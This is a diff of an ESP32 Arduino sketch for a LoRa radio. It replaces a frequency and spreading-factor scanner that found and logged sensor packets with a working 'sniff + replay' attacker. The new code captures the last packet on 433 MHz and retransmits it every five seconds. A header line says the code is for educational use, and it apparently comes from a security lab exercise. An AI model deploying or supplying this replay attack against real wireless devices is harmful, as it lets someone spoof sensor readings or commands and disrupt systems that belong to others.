@@ -15,63 +15,9 @@ This code is for educational purposes only. Unauthorized use may be illegal and 
 #define RST  14
 #define DIO0 26
 
-long freqList[] = {
-  433000000,
-  433050000,
-  433100000,
-  433150000
-};
-
-int sfList[] = {7, 8, 9, 10, 11, 12};
-
-int fIndex = 0;
-int sfIndex = 0;
-
-unsigned long lastSwitch = 0;
-const unsigned long scanInterval = 2000;
-
-bool locked = false;
-
-// =======================
-// APPLY CONFIG
-// =======================
-void applyConfig() {
-  LoRa.idle();
-
-  if (!LoRa.begin(freqList[fIndex])) {
-    Serial.println("Freq init failed!");
-    return;
-  }
-
-  LoRa.setSpreadingFactor(sfList[sfIndex]);
-  LoRa.setSignalBandwidth(125E3);
-  LoRa.setCodingRate4(5);
-
-  LoRa.receive();
-
-  Serial.print("Scan Freq: ");
-  Serial.print(freqList[fIndex]);
-  Serial.print(" | SF: ");
-  Serial.println(sfList[sfIndex]);
-}
-
-// =======================
-// VALIDASI PAYLOAD
-// =======================
-bool isValidPayload(String data) {
-  int commaCount = 0;
-
-  for (int i = 0; i < data.length(); i++) {
-    if (data[i] == ',') commaCount++;
-  }
-
-  // format: counter,timestamp,temp,status → 3 koma
-  if (commaCount >= 3 && data.length() > 10) {
-    return true;
-  }
-
-  return false;
-}
+String lastPacket = "";
+unsigned long lastReplay = 0;
+const unsigned long replayInterval = 5000; // 5 detik
 
 void setup() {
   Serial.begin(115200);
@@ -79,17 +25,24 @@ void setup() {
   SPI.begin(18, 19, 23, SS);
   LoRa.setPins(SS, RST, DIO0);
 
-  if (!LoRa.begin(freqList[0])) {
+  if (!LoRa.begin(433000000)) {
     Serial.println("LoRa init FAILED!");
     while (1);
   }
 
-  applyConfig();
+  LoRa.setSpreadingFactor(7);
+  LoRa.setSignalBandwidth(125E3);
+  LoRa.setCodingRate4(5);
 
-  Serial.println("Sniffer Scanner Ready...");
+  LoRa.receive();
+
+  Serial.println("Attacker Ready (Sniff + Replay)");
 }
 
 void loop() {
+  // =========================
+  // 1. SNIFF
+  // =========================
   int packetSize = LoRa.parsePacket();
 
   if (packetSize) {
@@ -99,60 +52,26 @@ void loop() {
       received += (char)LoRa.read();
     }
 
-    // =========================
-    // MODE SCANNING
-    // =========================
-    if (!locked) {
-      Serial.print("[RAW] ");
-      Serial.println(received);
+    Serial.print("[SNIFF] ");
+    Serial.println(received);
 
-      if (isValidPayload(received)) {
-        Serial.println("✅ VALID PACKET FOUND!");
-
-        Serial.print("LOCKED Freq=");
-        Serial.print(freqList[fIndex]);
-        Serial.print(" SF=");
-        Serial.println(sfList[sfIndex]);
-
-        Serial.print("DATA: ");
-        Serial.println(received);
-
-        locked = true;
-      } else {
-        Serial.println("❌ NOISE / INVALID");
-      }
-    }
-
-    // =========================
-    // MODE LOCKED (SNIFF ONLY)
-    // =========================
-    else {
-      Serial.print("[SNIFF LOCKED] ");
-      Serial.print(received);
-
-      Serial.print(" | RSSI: ");
-      Serial.print(LoRa.packetRssi());
-
-      Serial.print(" | SNR: ");
-      Serial.println(LoRa.packetSnr());
-    }
+    // simpan packet terakhir
+    lastPacket = received;
   }
 
   // =========================
-  // SCANNING ONLY IF NOT LOCKED
+  // 2. REPLAY
   // =========================
-  if (!locked && millis() - lastSwitch > scanInterval) {
-    lastSwitch = millis();
+  if (lastPacket != "" && millis() - lastReplay > replayInterval) {
+    lastReplay = millis();
 
-    sfIndex++;
-    if (sfIndex >= sizeof(sfList)/sizeof(sfList[0])) {
-      sfIndex = 0;
-      fIndex++;
-      if (fIndex >= sizeof(freqList)/sizeof(freqList[0])) {
-        fIndex = 0;
-      }
-    }
+    Serial.print("[REPLAY] ");
+    Serial.println(lastPacket);
 
-    applyConfig();
+    LoRa.beginPacket();
+    LoRa.print(lastPacket);
+    LoRa.endPacket();
+
+    LoRa.receive(); // balik ke mode receive
   }
 }
